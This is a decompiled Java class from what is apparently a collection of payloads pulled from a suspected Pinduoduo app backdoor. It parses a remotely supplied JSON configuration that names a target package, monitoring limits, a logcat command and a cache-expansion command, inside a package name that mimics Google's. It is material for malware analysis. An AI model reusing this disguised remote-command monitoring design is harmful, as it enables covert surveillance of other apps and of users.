package com.google.android.sd.biz_dynamic_dex.td.logcat.c.b;

import android.text.TextUtils;
import org.json.JSONObject;

public final class b {
  public String a;
  
  public String b;
  
  long c;
  
  int d;
  
  int e;
  
  String f;
  
  String g;
  
  private int h;
  
  public static b a(String paramString) {
    try {
      if (TextUtils.isEmpty(paramString))
        return null; 
      JSONObject jSONObject = new JSONObject(paramString);
      b b1 = new b();
      b1.a = paramString;
      b1.h = jSONObject.optInt("execute_type", 0);
      b1.b = jSONObject.optString("target_pkg");
      b1.c = jSONObject.optLong("max_monitor_time_sec", 360L);
      b1.d = jSONObject.optInt("max_monitor_page", 4);
      b1.e = jSONObject.optInt("max_monitor_line_per_page", 1000);
      b1.f = jSONObject.optString("logcat_cmd");
      b1.g = jSONObject.optString("expand_cache_cmd");
      return b1;
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder("obtain_error_");
      stringBuilder.append(exception.getMessage());
      com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.b.a(stringBuilder.toString());
      return null;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\8aeb045fad9343acbbd1a26998b6485a-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\td\logcat\c\b\b.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */